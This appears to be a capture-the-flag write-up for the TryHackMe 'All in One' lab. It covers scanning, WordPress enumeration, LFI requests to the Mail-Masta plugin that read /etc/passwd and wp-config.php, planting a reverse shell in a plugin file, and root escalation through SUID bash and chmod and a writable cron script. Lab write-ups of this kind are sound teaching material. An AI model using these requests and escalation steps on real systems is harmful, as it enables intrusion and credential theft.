
[TryHackMe Link](https://tryhackme.com/room/allinonemj){ .md-button }

!!! example "Description"

    <p id="desc" style="font-size:15px"></p>

This "All in One" Box has various vulnerabilities that can be exploited in several ways. There is not just one path to root, but many. In this blog, I have provided all the ways, so you can choose whichever you want.

## <b>Scanning</b>

* Assigned IP address: &nbsp; <b id="ip" style="color:purple"></b>
  
* Open Ports: 

| <p style="font-size:14px; color: black">PORT</p>      | <p style="font-size:14px; color: black">SERVICE</p> |  <p style="font-size:14px; color: black">DESCRIPTION                          |
| :---------: | :---------: | :----------------------------------: |
| <p id="p1" style="font-size:14px; color: purple"></p>      | <p id="s1" style="font-size:14px; color: purple"></p>  |<p id="d1" style="font-size:14px; color: purple"></p>   |
| <p id="p2" style="font-size:14px;  color: purple"></p>     | <p id="s2" style="font-size:14px; color: purple"></p>  |<p id="d2" style="font-size:14px; color: purple"></p> |
| <p id="p3" style="font-size:14px;  color: purple"></p>     | <p id="s3" style="font-size:14px; color: purple"></p>  |<p id="d3" style="font-size:14px; color: purple"></p> |


* Nmap Report:
  ```sh linenums="1" hl_lines="6 21 26"
    # Nmap 7.93 scan initiated Mon Feb 13 09:48:37 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.245.161
    Nmap scan report for 10.10.245.161
    Host is up (0.16s latency).
    Not shown: 997 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    | ftp-syst: 
    |   STAT: 
    | FTP server status:
    |      Connected to ::ffff:10.17.3.217
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 2
    |      vsFTPd 3.0.3 - secure, fast, stable
    |_End of status
    |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 e25c3322765c9366cd969c166ab317a4 (RSA)
    |   256 1b6a36e18eb4965ec6ef0d91375859b6 (ECDSA)
    |_  256 fbfadbea4eed202b91189d58a06a50ec (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Apache2 Ubuntu Default Page: It works
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.93%E=4%D=2/13%OT=21%CT=1%CU=35531%PV=Y%DS=5%DC=I%G=Y%TM=63EA4DE
    OS:2%P=aarch64-unknown-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS
    OS:=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M
    OS:505ST11NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4
    OS:B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
    OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
    OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
    OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
    OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
    OS:=40%CD=S)

    Network Distance: 5 hops
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Mon Feb 13 09:49:06 2023 -- 1 IP address (1 host up) scanned in 29.29 seconds
  ```



## <b>Enumeration</b>

Initially, I enumerated the **FTP** protocol and searched for anything suspicious, but the root directory was empty. Therefore, I moved ahead.

At port 80, as this is typical in most CTFs, I saw the default Apache welcome page. I continued to enumerate and explore the hidden directories. I discovered **/wordpress** (again, a typical result) and **/hackathons** (although it appeared to be a folder, later I got surprised).

<img id="image1" />

I visited both websites and discovered that Wordpress had the following:

* Theme: TwentyTwenty
* XML-RPC enabled
* Vulnerable plugin: Mail-Masta
* Users: Elyana
  
Meanwhile, **/hackathons** only provided me with this information. 

<img id="image2" />

While sneaking around the page source, I found some credentials -- **{--REDACTED--}** which I suspected were **`username:Base64`**. However, it failed to decode literally. Then, I asked my friend Cyberchef Magic Function to decode it, but it still didn't help. Nonetheless, I moved on.

I decided to conduct further research on the vulnerability in Wordpress. 

* I found that the **`TwentyTwenty`** theme did not have any significant vulnerabilities. 
  <img id="image3" />
* I attempted different **`XML-RPC methods`** to retrieve data but failed. 
* Then, I discovered that **`Mail-Masta`** had an exploit in the SearchSploit module, which I decided to try.

## <b>Initial Access</b>

Mail-Masta was affected by LFI, which was ideal for obtaining the contents of local server files.

!!! info "Local File Inclusion (LFI)"
    <span>**LFI** is a web vulnerability that allows attackers to access files on the server they shouldn't have access to. This occurs when a web application includes a file from the server's file system using user input without proper validation.</span>

To retrieve **`/etc/passwd`**, I used:

```http
GET /wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd HTTP/1.1
```

```sh linenums="1" hl_lines="24"
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
syslog:x:102:106::/home/syslog:/usr/sbin/nologin 
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin 
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin 
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin 
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin 
pollinate:x:109:1::/var/cache/pollinate:/bin/false 
elyana:x:1000:1000:Elyana:/home/elyana:/bin/bash 
mysql:x:110:113:MySQL Server,,,:/nonexistent:/bin/false 
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin 
ftp:x:111:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin 
```

This confirmed the user **elyana**.

I then attempted to retrieve the `wp-config.php` file. However, I didn't receive a response.

!!! failure "Failed"
    ```http
    GET /wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/www/html/wordpress/wp-config.php HTTP/1.1
    ```
 Later, I discovered that I needed to encode PHP files into text form in Base64:

!!! success "Succeeded"
    ```http
    GET /wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=file:///var/www/html/wordpress/wp-config.php HTTP/1.1
    ```

```php linenums="1" hl_lines="4 7"

<?php

/** MySQL database username */
define( 'DB_USER', 'elyana' );

/** MySQL database password */
define( 'DB_PASSWORD', '{--REDACTED--}' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

wordpress;
define( 'WP_SITEURL', 'http://' .$_SERVER['HTTP_HOST'].'/wordpress');
define( 'WP_HOME', 'http://' .$_SERVER['HTTP_HOST'].'/wordpress');

```

Although I attempted to reuse the SQL password for the SSH service, it didn't work. Eventually, I logged in as **elyana** in Wordpress and changed the content of the **Reflex Gallery plugin** in **`reflex-gallery/lib/gallery-class.php`** with a reverse shell. 

<img id="image4" />
<img id="image5" />

!!! abstract "Note"
    <span>Note: You need to deactivate the reflex-gallery plugin first to change the PHP file, then activate it again.</span>

When **`/wordpress/wp-content/plugins/reflex-gallery/lib/gallery-class.php`** was accessed on browser, I obtained a shell with the `www-data` user.

<img id="image6" />

## <b>Privilege Escalation</b>

### <b>Gaining User access (Elyana)</b>

!!! warning ""

    === "Private.txt"

        <span>As soon as I got the shell, I checked to see if `www-data` could read **user.txt**, but it was not possible. However, there was a hint file that said,</span> 
        
        ```dtd
        "Elyana's user password is hidden in the system. Find it ;)"
        ```
        
        <span>I searched for files owned by elyana using the command and found a **private.txt** file in the **/etc/** folder.</span>
        
        ```dtd 
        find / -user elyana 2>/dev/null 
        ```
        
        <span>The file contained the username and password for elyana's user account. Using SSH, I escalated my privileges to elyana.</span>

    === "Chmod SUID"

        <span>Then, I checked all SUID set bit binaries to see what I could exploit, and ran the command:</span>

        ```dtd
        find / -user root -perm /4000 -ls 2>/dev/null
        ```

        <span>This showed me that the following binaries were available in SUID set:</span>

        ```dtd
        -rwsr-sr-x 1 root root 1.1M Jun 6 2019 /bin/bash
        -rwsr-sr-x 1 root root 59K Jan 18 2018 /bin/chmod
        -rwsr-sr-x 1 root root 392K Apr 4 2018 /usr/bin/socat
        ```

        <span>Since my goal was to escalate and obtain **user.txt**, I focused on using**`/bin/chmod`**, which can be run as root.</span>

        <img id="image7" />

        !!! info ""
            <span>**Note:** This method actually runs as a root. But, this is one of the possibility to get user.txt from www-data.</span>


### <b>Gaining Root access</b>

You can escalate your privilege to root in different ways:

!!! bug ""


    === "CRON job"

        <span>After noticing a cronjob that ran **`/var/backups/script.sh`**, I realized that I had all the permissions as `elyana`. </span>

        <img id="image8" />
        
        <span>So, I changed the code to:</span>
        
        ```dtd
        cp /root/root.txt /tmp/root.txt. 
        ```        

    === "Bash Binary"

        <span>We already knew about the SUID binaries, including **/bin/bash**, **/bin/chmod**, and **/usr/bin/socat**. I decided to check with the bash binary by running the following command:</span>

        ```dtd 
        /bin/bash -p
        ```
        <span>This command allowed me to get root access. What else can I ask? </span>
        
        <span>I then tried to read the root.txt file located at **`/root/root.txt`** </span>

        !!! info ""
            <span>**Note:** /bin/bash can also be executed by **`www-data`**. So you get root directly from `www-data` bypassing `elyana`</span>

<script>

// JSON object
const data = {
    "desc": "This is a fun box where you will get to exploit the system in several ways. Few intended and unintended paths to getting user and root access.",
    "ip":  "10.10.245.161",
    "ports": "21/tcp,ftp,vsftpd 3.0.3;22/tcp,ssh,OpenSSH 7.6p1 Ubuntu 4ubuntu0.3;80/tcp,http,Apache httpd 2.4.29",
    "difficulty":"easy",
    "id": "6"
}


function updateHTML() {

    const keys = Object.keys(data);
    const values = Object.values(data);

    for(var z=0; z < keys.length; z++){

        if(keys[z] === "ports"){
            const ports = data.ports.split(';');
            for(var i = 0; i < ports.length; i++){
                document.getElementById("p"+(i+1)).innerHTML = ports[i].split(',')[0].toUpperCase();
                document.getElementById("s"+(i+1)).innerHTML = ports[i].split(',')[1].toUpperCase();
                document.getElementById("d"+(i+1)).innerHTML = ports[i].split(',')[2];
            }
        }
        else{
            try{
            document.getElementById(keys[z]).innerHTML = values[z];
            }
            catch(error){
                console.log(values[z]);
            }
        }
    }

    // replace the values with your specific filenames and number of images and img tags
    const numImgTags = document.getElementsByTagName('img').length;

    for (let i = 1; i <= numImgTags; i++) {
    const imgTag = document.getElementById('image' + i);
        if (imgTag) {
            imgTag.src = '../images/'+data.difficulty[0]+data.id+'-image' + i + '.png';
        }
    }


}

updateHTML();
</script>